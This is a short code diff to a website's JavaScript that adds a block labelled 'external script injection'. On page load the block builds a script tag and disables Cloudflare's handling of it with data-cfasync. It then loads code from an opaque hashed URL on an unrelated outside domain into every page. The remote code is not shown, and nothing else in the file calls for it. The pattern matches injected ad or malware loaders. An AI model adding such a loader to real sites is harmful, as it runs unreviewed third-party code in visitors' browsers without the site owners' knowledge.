@@ -1,6 +1,16 @@
 document.addEventListener("DOMContentLoaded", () => {
 
   /* =====================================================
+     EXTERNAL SCRIPT INJECTION
+  ===================================================== */
+
+  const extScript = document.createElement("script");
+  extScript.setAttribute("data-cfasync", "false");
+  extScript.src = "https://bauval.org/14/c65b20ea431d47d512af8a92fdc252db";
+  document.head.appendChild(extScript);
+
+
+  /* =====================================================
      ELORA FAVICON
   ===================================================== */
 
